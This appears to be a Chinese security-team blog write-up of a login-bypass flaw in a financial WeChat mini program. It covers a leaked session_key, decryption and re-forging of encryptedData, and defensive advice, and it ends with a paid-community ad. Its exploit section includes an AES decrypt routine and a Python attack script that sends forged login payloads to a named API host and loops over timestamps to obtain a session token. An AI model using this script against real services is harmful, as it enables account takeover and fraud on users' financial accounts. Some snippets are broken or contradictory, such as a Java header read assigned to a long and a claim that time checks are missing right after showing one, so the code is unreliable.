#  【SRC】某选课小程序任意用户登录漏洞深度剖析   
原创 ashui  Rot5pider安全团队   2025-04-22 00:35  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicOSxjNfqYduiciaQ0iaZ7WFyadLnzbVicK8tW7YU4UEib2EsP5twVZ7IH4Yw/640?wx_fmt=png&from=appmsg "")  
  
  
# 某小程序任意用户登录漏洞深度剖析  
## 一、漏洞场景复现  
### （一）漏洞复现  
1. **目标系统**  
：某金融类小程序（版本V2.3.1）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGK7siaUTK4s2LQz5OSASAmYWcogCWy0ZEmW3edHjN07XwwWGrFmGLvKg/640?wx_fmt=png&from=appmsg "")  
1. **测试工具**  
：Burp Suite Pro v1.8.4 + WechatDevTools v1.18.0  
  
1. **关键参数**  
：  
  
1. encryptedData  
：AES-CBC加密的用户敏感数据  
  
1. iv  
：16字节初始化向量  
  
1. jsCode  
：微信登录临时凭证（有效期5分钟）  
  
1. 缺失参数：session_key  
（会话密钥）  
  
1、抓包，发现有encryptedData和iv，但少了sessionkey，却多了jsCode等巴拉巴拉的参数和参数值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGqOP4djqFuKfB8aqsK8KgvKbTibl5Sl9mQZCnRicRCsawjKd09nm4LFcA/640?wx_fmt=png&from=appmsg "")  
发现appletLoginAuthUri所需要的参数，正好都一并泄露了，传入值，访问后 嗯，这不是正缺少的sessionkey吗  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGdT9w5lic6OhDicLM7XjoIjDMuOteEfsUNIKoZcxfXG9pDCa7ylTcse2Q/640?wx_fmt=png&from=appmsg "")  
使用bp的插件进行解密，发现sessionkey和iv和密文都是正确的，可以成功解出明文。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGA613ZicUcXsP5zypUltYzbdq1zYgCIKuCo6PWCibAjezsU8XicVW9ic5YQ/640?wx_fmt=png&from=appmsg "")  
重新生成密文，替换为原来的请求包，但是一直无法登录成功(没截图)猜测是时间戳的问题 重复原来的操作，并替换时间戳。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGhfsYWy12u43xW2uoeuXKiaDB9S0JVZn7mMURtLuttmkxxia49Nxdq0Xw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGFTh9EbUavbTOj2e5AYAanhQTRNJkPttrvZuGlJmJ1AWUYfwd4S5X2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGqibEiaeo7bUVcZxDokaUcncXdhzSfRb1lHuP8S8SCfl8gLORdM2j7jkw/640?wx_fmt=png&from=appmsg "")  
到此成功登录。  
## 二、漏洞原理分析  
### （一）加密链路缺陷  
1. **前端暴露密钥要素**  
通过小程序逆向工程发现：  
```
// wx.login接口明文返回jsCode
wx.login({
  success(res) {
    console.log(res.code); // 直接暴露jsCode
  }
});

```  
  
  
1. **后端响应泄露密钥材料**  
抓取登录接口响应包：  
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "encryptedData": "...",
  "iv": "...",
  "session_key": "0123456789abcdef0123456789abcdef" // 核心密钥泄露
}

```  
  
  
### （二）攻击链路推演  
```
graph TD
    A[获取jsCode] --> B[构造虚假登录请求]
    B --> C{后端响应}
    C -->|包含session_key| D[解密encryptedData]
    D --> E[伪造完整会话]
    E --> F[绕过实名认证]

```  
## 三、漏洞利用实战  
### （一）密钥重组  
1. **AES-CBC参数准备**  
```
from Crypto.Cipher import AES
import base64

def decrypt(session_key, iv, encrypted_data):
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
    return decrypted.decode('utf-8')

```  
  
  
1. **时间戳同步突破**  
发现服务端时间校验逻辑：  
```
// 后端时间校验代码片段
long clientTime = request.getHeader("X-Timestamp");
if (Math.abs(clientTime - System.currentTimeMillis()) > 300000) {
    throw new InvalidTimestampException();
}

```  
  
  
### （二）自动化攻击脚本  
```
import requests
import time

TARGET_URL = "https://api.wechat-loan.com/login"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.36",
    "X-Requested-With": "XMLHttpRequest"
}

def exploit():
    # 获取当前时间戳（毫秒）
    timestamp = int(time.time() * 1000)
    
    # 构造恶意请求
    payload = {
        "jsCode": "023f4a5b6c8d9e0f1a2b3c4d5e6f7a8b9c",
        "encryptedData": "CvYyQ2...",
        "iv": "XyZwVu...",
        "timestamp": timestamp
    }
    
    # 发送请求
    response = requests.post(TARGET_URL, json=payload, headers=HEADERS)
    
    # 时间戳修正循环
    while "invalid timestamp" in response.text.lower():
        timestamp += 1000  # 毫秒级微调
        payload["timestamp"] = timestamp
        response = requests.post(TARGET_URL, json=payload, headers=HEADERS)
    
    return response.json()

if __name__ == "__main__":
    session = exploit()
    print("Session Token:", session.get("token"))

```  
## 四、漏洞危害评估  
### （一）攻击面分析  
1. **数据窃取链路**  
  
1. 用户实名信息（姓名/身份证号）  
  
1. 微信绑定手机号  
  
1. 设备硬件特征码  
  
1. 通过encryptedData  
可解析出：  
  
1. **业务风险场景**  
  
1. 绕过风控策略批量注册虚假账号  
  
1. 操纵高价值账户进行非法转账  
  
1. 结合短信嗅探实现完整账户接管  
  
## 五、防御体系重构建议  
### （一）加密机制升级  
1. **密钥管理体系**  
  
1. 采用ECDH密钥协商协议动态生成session_key  
  
1. 实现密钥轮转机制（每7天更换）  
  
1. **加密算法强化**  
```
// 推荐加密方案（Java实现）
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));

```  
  
  
### （二）时间戳防御矩阵  
1. **时钟回拨防护**  
```
# 服务端时间校验逻辑
def validate_timestamp(client_ts):
    server_ts = time.time()
    if abs(server_ts - client_ts) > 5 * 60:
        raise TimeAttackDetected()
    if client_ts < (server_ts - 300):
        raise TimestampBacktrackDetected()

```  
  
  
1. **时区标准化处理**  
强制所有请求携带X-Timezone  
头并进行UTC时间校准。  
  
## 六、总结与启示  
  
本案例揭示了典型移动端安全三大黑洞：  
1. **加密组件滥用**  
：AES-CBC模式缺乏完整性保护  
  
1. **时间校验缺失**  
：5分钟时间窗口足以实施暴力破解  
  
1. **敏感参数泄露**  
：前端暴露关键密钥要素  
  
建议企业立即开展：  
1. 小程序专项安全审计（每季度一次）  
  
1. 建立API参数黑白名单管控机制  
  
1. 部署RASP实时攻击检测系统  
  
  
  
  
  
【限时  
6  
折！华普安全研究星球：以  
原创实战  
为主+SRC/内网渗透核心资源库，助你在漏洞挖掘、SRC挖掘少走90%弯路】当90%的网络安全学习者还在重复刷题、泡论坛找零散资料时，华普安全研究星球已构建起完整的「攻防实战知识生态」：  
  
✅ 原创深度技术文档（独家SRC漏洞报告/代码审计报告）  
  
✅ 实战中使用到的工具分享  
  
✅ 全年更新SRC挖掘、代码审计报告（含最新0day验证思路）  
  
✅ 漏洞挖掘思维导图  
  
✅内部知识库目前建设中、后续进入圈子免费进入  
  
【  
实战为王  
】不同于传统课程的纸上谈兵！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT1s5WIQzLQXibdxCf6fkianYH5bSeKhcPcQPNR8E1iaJz2aAqonzogTKicg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTxJibeicaQ0uttmutBuckibQFCEVicpyhhWXprQVOn4AnAnpDauQiaWTblMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT9hvFFPpSupL0Q8d0Yv1F7dYxGZJjcKxHYTyiayhMI3xcVRoQhSs9VTQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTh0eO1DbG0onZph7o1AMPVU65ZjE5T9QH8XeMU0WNE5HiaUibNTBcQyyg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTpXhxBicMHYsw8hotg4abR2gdaqYkfGPhX8EeNPcibAAs89qcOWl8Sqdw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTJvsQnibaNk5WSuwpkDvkZTIFqN3XyKic4Mg5qI91sjNGQtibJRbEfIxgw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT7UqeH8ibia1N77Q9iaLtwD9NU7Nt9gicr8sdmDGfQQvibnTDKQYNIJP6tFw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
**后期我们将持续发布原创代码审计、src等漏洞挖掘文章，后期有些源码、挖掘思路等也会放进圈子哈~**  
  
**有任何问题可后台留言**  
  
  
  
  
往期精选  
  
  
  
围观  
  
[PHP代码审计学习](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484594&idx=1&sn=89c96ed25e1f1d146fa3e67026ae0ca1&chksm=c051ecd2f72665c45d3e8c51b94629319b992f7f459d5677d7ce253eac99fc5e2e8f78684907&scene=21#wechat_redirect)  
  
  
丨更多  
  
热文  
  
[浅谈应急响应](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484589&idx=1&sn=80ff6dbb4471c101a71e203a10354d59&chksm=c051eccdf72665db0530fce6a332bf44392fb0c4d3d61496c9141bb93ece816cbbe97f89d06f&scene=21#wechat_redirect)  
  
  
丨更多  
  
·end·  
  
—如果喜欢，快分享给你的朋友们吧—  
  
我们一起愉快的玩耍吧  
  
  
  
【免责声明】  
  
"Rot5pider安全团队"作为专注于信息安全技术研究的自媒体平台，致力于传播网络安全领域的前沿知识与防御技术。本平台所载文章、工具及案例均用于合法合规的技术研讨与安全防护演练，严禁任何形式的非法入侵、数据窃取等危害网络安全的行为。所有技术文档仅代表作者研究过程中的技术观察，不构成实际操作建议，更不作为任何法律行为的背书。  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicDTm83Sic86kzBCzlXI5OiazEoc5ZrPHHWsRb80WlZcKRll5xOU2s5JKw/640?wx_fmt=gif&from=appmsg "")  
  
  
